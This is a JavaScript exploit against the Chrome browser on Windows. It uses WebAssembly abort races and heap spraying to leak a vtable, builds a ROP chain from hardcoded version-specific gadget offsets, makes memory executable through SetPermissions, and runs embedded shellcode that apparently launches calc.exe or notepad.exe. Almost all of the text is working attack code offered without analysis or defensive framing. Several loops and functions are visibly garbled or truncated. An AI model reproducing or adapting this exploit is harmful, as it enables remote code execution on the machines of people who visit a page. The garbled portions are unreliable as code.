        var importObject_InfoHandle;
        var importObject_OobHandle;
        var importObject;
  
        var wasm_filePath;
        var dataView;
      
        var wasmCode_Info;
        var wasmCode_Oob;
        var wasmCode_InfoHandle;
        var wasmCode_OobHandle;
        var wasmCode_Init;
  
        var sprayArr_Info;
        var sprayArr_Oob;
        var sprayCount_Info;
        var sprayCount_Oob;
  
        var track_origin;
        var exploit_Step;
  
        var shellCode;
        var global_Arr;
        var instanceArr;
        var stackArr;
        
        var exploit_Success;
  
        var mediaStreamTrack_VTable;
        var WebAudioMediaStreamSource_VTable;
  
        var mediaStreamTrack_VTable_Offset_Arr=         [0x085455A0, 0x085465a0, 0x08546e60];
        var WebAudioMediaStreamSource_VTable_Offset_Arr=[0x0863e880, 0x0863f8c0, 0x08640180];
        var mov_rsp_rax_Offset_Arr=                     [0x06ae2c7b, 0x06ae37ab, 0x06ae48fb];
        var mov_rcx_rax_Offset_Arr=                     [0x0488f7f4, 0x048900d4, 0x04890ea4];
        var mov_rdx_rcx_Offset_Arr=                     [0x038d87bd, 0x038d92fd, 0x038da61d];
        var pop_r8_Offset_Arr=                          [0x000683cb, 0x000683cb, 0x000683cb];
        var pop_r9_Offset_Arr=                          [0x01141ddf, 0x011422bf, 0x011421df];
        var jmp_rsp_Offset_Arr=                         [0x0003045f, 0x0003045f, 0x00024c59];
        var api_SetPermissions_Offset_Arr=              [0x03f14130, 0x03f14c70, 0x03f15b30];
  
        var mediaStreamTrack_VTable_Offset;
        var WebAudioMediaStreamSource_VTable_Offset; //chrome!blink::WebAudioMediaStreamSource::`vftable'
  
        //Rop Chain
        var mov_rsp_rax_Offset;  //48 89 c4 c3                         mov rsp,rax;ret;
        var mov_rcx_rax_Offset;  //48 89 c1 8b 01 c3                   mov rcx,rax;mov eax,[rcx];ret;
        var mov_rdx_rcx_Offset;  //48 89 ca 48 85 c0 74 db c3          mov rdx,rcx;test rax,rax;jz;ret;
        var pop_r8_Offset;       //41 58 c3                            pop r8;ret;
        var pop_r9_Offset;       //41 59 c3                            pop r9;ret;
        var jmp_rsp_Offset;      //ff e4                               jmp rsp;
  
        var api_SetPermissions_Offset;  //chrome!gin::`anonymous namespace'::PageAllocator::SetPermissions  
  
        var base_Address;
  
        var mov_rsp_rax_Address;
        var mov_rcx_rax_Address;
        var mov_rdx_rcx_Address;
        var pop_r8_Address;
        var pop_r9_Address;
        var jmp_rsp_Address;
  
        var api_SetPermissions_Address;
  
        function gc() {
          for (let i = 0; i < 2000; i++) {
            new ArrayBuffer(0x200000);
          }
          for (let i=0;i<0x20000;i++){
                  anchor = document.createElement("a");
              }  
        }
        function create_Global(obj,index,val){
          global_Arr[index] = new WebAssembly.Global({value:'f64', mutable:true}, convertInt64ToFloat64(BigInt(val)));
          let global_name  = String.fromCharCode(index+0x21);
          obj['b'][global_name] = global_Arr[index];
        }
        function make_import_object_oob(obj){
          obj['a'] = { 'f': () => { } };
          obj['b'] = {};
          // origin Size = 0x3C,Over Size = 0x3F;
          // call    qword ptr [rax+8h]
          for (let i=0;i<0x3F; i++){
            if (i == 0x3E){
              create_Global(obj,i,pop_r8_Address);
              i++;create_Global(obj,i,mov_rsp_rax_Address);
              i++;create_Global(obj,i,mov_rcx_rax_Address);
              i++;create_Global(obj,i,mov_rdx_rcx_Address);
              i++;create_Global(obj,i,pop_r8_Address);
              i++;create_Global(obj,i,0x10000);
              i++;create_Global(obj,i,pop_r9_Address);
              i++;create_Global(obj,i,0x3);
              i++;create_Global(obj,i,api_SetPermissions_Address);
              i++;create_Global(obj,i,jmp_rsp_Address);
              //mov rdi,rsp;mov rax,55555555AAAAAAAAh;add rdi,8;cmp qword ptr [rdi],rax;jne offset-4;add rdi,8;jmp rdi;
              i++;create_Global(obj,i,0xAAAAB848E7894890n);
              i++;create_Global(obj,i,0x834855555555AAAAn);
              i++;create_Global(obj,i,0x48F77507394808C7n);
              i++;create_Global(obj,i,0x909090E7FF08C783n);
            }else{
              create_Global(obj,i,0x4141414141414141n);
            }
          }
          let byteArr = convertBigIntToByteArray(WebAudioMediaStreamSource_VTable);
          shellCode = new Uint8Array([ 
            0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x55, 0x55, 0x55, 0x48, 0xB8, ...byteArr, 0x48, 0x8B, 0x3E, 0x48, 
            0x89, 0x06, 0x48, 0x81, 0xEC, 0x00, 0x01, 0x00, 0x00, 0x56, 0x48, 0xC7, 0xC1, 0x08, 0x00, 0x00, 
            0x00, 0x48, 0x89, 0xC6, 0xF3, 0x48, 0xA5, 0x5E,//mov rax,WebAudioMediaStreamSource_VTable;mov rdi,qword ptr [rsi];mov qword ptr [rsi],rax;sub rsp,100h;push rsi;mov rcx,8;mov rsi,rax;rep movs qword ptr [rdi],qword ptr [rsi];pop rsi;
            0x56, 0x48, 0x8B, 0xF4, 0x48, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0xEF, 0x02, 0x00, 
            0x00, 0x48, 0x8B, 0xE6, 0x5E, 
            0x4C, 0x89, 0xFC, 0x48, 0x81, 0xEC, 0xC8, 0x02, 0x00, 0x00, 0xC3,//mov rsp,r15;sub rsp,0x2C8;ret;
            0x89, 0x4C, 0x24, 0x08, 0x56, 0x57, 0x48, 0x81, 0xEC, 0xA8, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 
            0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x60, 
            0x48, 0x8B, 0x40, 0x18, 0x48, 0x89, 0x04, 0x24, 0x48, 0x8B, 0x04, 0x24, 0x48, 0x8B, 0x40, 0x10, 
            0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x8B, 0x44, 0x24, 0x58, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 
            0x8B, 0x44, 0x24, 0x30, 0x48, 0x83, 0x78, 0x30, 0x00, 0x0F, 0x84, 0x5E, 0x02, 0x00, 0x00, 0xC7, 
            0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x40, 0x30, 
            0x48, 0x89, 0x44, 0x24, 0x78, 0x48, 0x8D, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 
            0x24, 0x30, 0x48, 0x8B, 0xF8, 0x48, 0x8D, 0x71, 0x58, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xF3, 0xA4, 
            0x48, 0x8D, 0x44, 0x24, 0x40, 0x48, 0x8D, 0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xF8, 
            0x48, 0x8B, 0xF1, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0x48, 0x8B, 0x44, 0x24, 0x78, 0x48, 
            0x63, 0x40, 0x3C, 0x48, 0x8B, 0x4C, 0x24, 0x78, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 
            0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x89, 0x44, 
            0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x83, 
            0x7C, 0x24, 0x28, 0x00, 0x75, 0x05, 0xE9, 0x64, 0xFF, 0xFF, 0xFF, 0xC7, 0x44, 0x24, 0x14, 0x00, 
            0x00, 0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x14, 0xFF, 0xC0, 0x89, 0x44, 0x24, 0x14, 0x0F, 
            0xB7, 0x44, 0x24, 0x42, 0x39, 0x44, 0x24, 0x14, 0x73, 0x61, 0x8B, 0x44, 0x24, 0x14, 0x48, 0x8B, 
            0x4C, 0x24, 0x48, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x18, 0x8B, 0x44, 
            0x24, 0x38, 0xC1, 0xE8, 0x0D, 0x8B, 0x4C, 0x24, 0x38, 0xC1, 0xE1, 0x13, 0x0B, 0xC1, 0x89, 0x44, 
            0x24, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x0F, 0xBE, 0x00, 0x83, 0xF8, 0x61, 0x7C, 0x16, 0x48, 
            0x8B, 0x44, 0x24, 0x18, 0x0F, 0xBE, 0x00, 0x8B, 0x4C, 0x24, 0x38, 0x8D, 0x44, 0x01, 0xE0, 0x89, 
            0x44, 0x24, 0x38, 0xEB, 0x14, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x0F, 0xBE, 0x00, 0x8B, 0x4C, 0x24, 
            0x38, 0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24, 0x38, 0xEB, 0x8A, 0x8B, 0x44, 0x24, 0x28, 0x48, 
            0x8B, 0x4C, 0x24, 0x78, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x70, 0x48, 
            0x8B, 0x44, 0x24, 0x70, 0x8B, 0x40, 0x18, 0x89, 0x44, 0x24, 0x68, 0x48, 0x8B, 0x44, 0x24, 0x70, 
            0x8B, 0x40, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x78, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x89, 
            0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x14, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 
            0x8B, 0x44, 0x24, 0x14, 0xFF, 0xC0, 0x89, 0x44, 0x24, 0x14, 0x8B, 0x44, 0x24, 0x68, 0x39, 0x44, 
            0x24, 0x14, 0x0F, 0x83, 0xF0, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x50, 0x00, 0x00, 0x00, 0x00, 
            0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x8B, 0x00, 0x48, 0x03, 0x44, 0x24, 0x78, 0x48, 
            0x89, 0x44, 0x24, 0x08, 0x48, 0x8B, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC0, 0x04, 
            0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x08, 0x48, 0x89, 0x44, 
            0x24, 0x18, 0x8B, 0x44, 0x24, 0x50, 0xC1, 0xE8, 0x0D, 0x8B, 0x4C, 0x24, 0x50, 0xC1, 0xE1, 0x13, 
            0x0B, 0xC1, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x0F, 0xBE, 0x00, 0x8B, 0x4C, 
            0x24, 0x50, 0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x48, 
            0xFF, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x18, 0x48, 0x8B, 0x44, 0x24, 0x18, 0x0F, 0xBE, 0x40, 0xFF, 
            0x85, 0xC0, 0x75, 0xBE, 0x8B, 0x44, 0x24, 0x38, 0x8B, 0x4C, 0x24, 0x50, 0x03, 0xC8, 0x8B, 0xC1, 
            0x89, 0x44, 0x24, 0x50, 0x8B, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x39, 0x44, 0x24, 0x50, 0x75, 
            0x52, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x8B, 0x40, 0x24, 0x48, 0x8B, 0x4C, 0x24, 0x78, 0x48, 0x03, 
            0xC8, 0x48, 0x8B, 0xC1, 0x8B, 0x4C, 0x24, 0x14, 0xD1, 0xE1, 0x8B, 0xC9, 0x0F, 0xB7, 0x04, 0x08, 
            0x66, 0x89, 0x44, 0x24, 0x10, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x8B, 0x40, 0x1C, 0x48, 0x8B, 0x4C, 
            0x24, 0x78, 0x48, 0x03, 0xC8, 0x48, 0x8B, 0xC1, 0x0F, 0xB7, 0x4C, 0x24, 0x10, 0xC1, 0xE1, 0x02, 
            0x48, 0x63, 0xC9, 0x8B, 0x04, 0x08, 0x48, 0x8B, 0x4C, 0x24, 0x78, 0x48, 0x03, 0xC8, 0x48, 0x8B, 
            0xC1, 0xEB, 0x0C, 0xE9, 0xF8, 0xFE, 0xFF, 0xFF, 0xE9, 0x92, 0xFD, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 
            0x81, 0xC4, 0xA8, 0x00, 0x00, 0x00, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 
            0x48, 0x83, 0xEC, 0x28, 0xE8, 0x17, 0xFD, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 
            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 
            0x48, 0x81, 0xEC, 0x18, 0x01, 0x00, 0x00, 0xC6, 0x84, 0x24, 0x00, 0x01, 0x00, 0x00, 0x6E, 0xC6, 
            0x84, 0x24, 0x01, 0x01, 0x00, 0x00, 0x6F, 0xC6, 0x84, 0x24, 0x02, 0x01, 0x00, 0x00, 0x74, 0xC6, 
            0x84, 0x24, 0x03, 0x01, 0x00, 0x00, 0x65, 0xC6, 0x84, 0x24, 0x04, 0x01, 0x00, 0x00, 0x70, 0xC6, 
            0x84, 0x24, 0x05, 0x01, 0x00, 0x00, 0x61, 0xC6, 0x84, 0x24, 0x06, 0x01, 0x00, 0x00, 0x64, 0xC6, 
            0x84, 0x24, 0x07, 0x01, 0x00, 0x00, 0x2E, 0xC6, 0x84, 0x24, 0x08, 0x01, 0x00, 0x00, 0x65, 0xC6, 
            0x84, 0x24, 0x09, 0x01, 0x00, 0x00, 0x78, 0xC6, 0x84, 0x24, 0x0A, 0x01, 0x00, 0x00, 0x65, 0xC6, 
            0x84, 0x24, 0x0B, 0x01, 0x00, 0x00, 0x00, 0xC6, 0x44, 0x24, 0x78, 0x63, 0xC6, 0x44, 0x24, 0x79, 
            0x61, 0xC6, 0x44, 0x24, 0x7A, 0x6C, 0xC6, 0x44, 0x24, 0x7B, 0x63, 0xC6, 0x44, 0x24, 0x7C, 0x2E, 
            0xC6, 0x44, 0x24, 0x7D, 0x65, 0xC6, 0x44, 0x24, 0x7E, 0x78, 0xC6, 0x44, 0x24, 0x7F, 0x65, 0xC6, 
            0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x00, 0xB9, 0xD2, 0x8A, 0x2B, 0x8D, 0xE8, 0x7F, 0xFC, 0xFF, 
            0xFF, 0x48, 0x89, 0x44, 0x24, 0x58, 0xB9, 0x79, 0xCC, 0x3F, 0x86, 0xE8, 0x70, 0xFC, 0xFF, 0xFF, 
            0x48, 0x89, 0x44, 0x24, 0x50, 0x41, 0xB8, 0x68, 0x00, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8D, 0x8C, 
            0x24, 0x90, 0x00, 0x00, 0x00, 0xFF, 0x54, 0x24, 0x58, 0x41, 0xB8, 0x18, 0x00, 0x00, 0x00, 0x33, 
            0xD2, 0x48, 0x8D, 0x4C, 0x24, 0x60, 0xFF, 0x54, 0x24, 0x58, 0xC7, 0x84, 0x24, 0x90, 0x00, 0x00, 
            0x00, 0x68, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x60, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 
            0x8D, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0xC7, 0x44, 0x24, 
            0x38, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 
            0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x45, 0x33, 
            0xC9, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x54, 0x24, 0x78, 0x33, 0xC9, 0xFF, 0x54, 0x24, 0x50, 0x48, 
            0x81, 0xC4, 0x18, 0x01, 0x00, 0x00, 0xC3
          ]);
        }
        function make_import_object_oob_Handle(obj){
          obj['a'] = { 'f': () => { } };
          obj['b'] = {};
          for (let i=0;i<0x40; i++){
            let global = new WebAssembly.Global({value:'f64', mutable:true}, 0); 
            let global_name  = String.fromCharCode(i+0x21);
            obj['b'][global_name] = global;
          }
        }
        function make_import_object_info(obj){
          obj['a'.repeat(0x92)] = { 'f': function () { } };
        }
        function make_track_origin(){
          let canvas = document.createElement('canvas');
          let stream = canvas.captureStream(25);
          let mediaRecoder = new MediaRecorder(stream);
          track_origin = stream.getVideoTracks()[0];
          stream = null;
          canvas = null;
        }
        function make_spray_Oob(){
          let ac = new AudioContext();
          let node = null;
          for (let i=0;i{ Controller.abort();return 1; });
          Array.prototype.concat.call([1,1,1],a);
        }
  
        function free_LFH_End(){
          if (exploit_Step == -1) {
            return;
          }
          if (exploit_Step ==0 ){
            setTimeout(vtable_leak,10);
            return;
          }
          if (exploit_Step == 1){
            setTimeout(vtable_overwrite,10);
            return;
          }
          if (exploit_Step>1){
            if (!exploit_Success){
              setTimeout(()=>{wasm_exploit(importObject_OobHandle,oob_write,new AbortController(),"a");},10);
              return;
            }
          }
        }
        function make_or_fill_LFH(count){
          for (let i=0;i{ 	
            trigger(Controller);
            WebAssembly.instantiateStreaming(fetch(wasm_filePath), importObjectHandle).then(obj => {});
            make_or_fill_LFH(0x6e);
            exploit_Step++;
            return { 'f': ()=>{} };
          });
          let signal = Controller.signal;
          WebAssembly.instantiateStreaming(fetch(wasm_filePath,{ signal }), importObject).then(func);
        }
  
        function oob_write(obj){
          //code run
          instanceArr.push(obj);
          if (exploit_Step==9){
            for (let i=0;i < sprayCount_Oob;i++){
              if (sprayArr_Oob[i] != null){
                sprayArr_Oob[i].stop();
              }
            }
            exploit_Success = 1;
            if (global_Arr[0x3E].value == convertInt64ToFloat64(pop_r8_Address)){
                alert("exploit failed!");
            }
          }
        }
  
        function info_leak(obj){
          //infoLeak
          instanceArr.push(obj);
          let buffer = new DataView(obj.instance.exports.mem.buffer,0);
          mediaStreamTrack_VTable = buffer.getBigUint64(0x20,true);
          let addr_check = buffer.getUint32(0x24,true) & 0xfff0;
          if (addr_check != 0x7FF0){
            alert("info leak failed!");
            exploit_Step = -1;
          }
          base_Address = mediaStreamTrack_VTable - BigInt(mediaStreamTrack_VTable_Offset);
          mov_rsp_rax_Address = base_Address + BigInt(mov_rsp_rax_Offset);
          mov_rcx_rax_Address = base_Address + BigInt(mov_rcx_rax_Offset);
          mov_rdx_rcx_Address = base_Address + BigInt(mov_rdx_rcx_Offset); 
          pop_r8_Address = base_Address + BigInt(pop_r8_Offset); 
          pop_r9_Address = base_Address + BigInt(pop_r9_Offset);
          jmp_rsp_Address = base_Address + BigInt(jmp_rsp_Offset);
          api_SetPermissions_Address = base_Address + BigInt(api_SetPermissions_Offset);
          WebAudioMediaStreamSource_VTable = base_Address + BigInt(WebAudioMediaStreamSource_VTable_Offset);
        }
  
        function vtable_leak(){
          make_import_object_info(importObject);
          wasm_filePath = typedArrayToURL(wasmCode_Info,'application/wasm');
          wasm_exploit(importObject_InfoHandle,info_leak,new AbortController(),'a'.repeat(0x92));
        }
  
        function vtable_overwrite(){
          importObject={};
          make_import_object_oob(importObject);
          wasm_filePath = typedArrayToURL(wasmCode_Oob,'application/wasm');
          wasm_exploit(importObject_OobHandle,oob_write,new AbortController(),"a");  
        }
        function _start(){
          var_init();
          if (!selectChromeVersion()){
            return;
          }
          make_or_fill_LFH(0x20);
        }
        _start();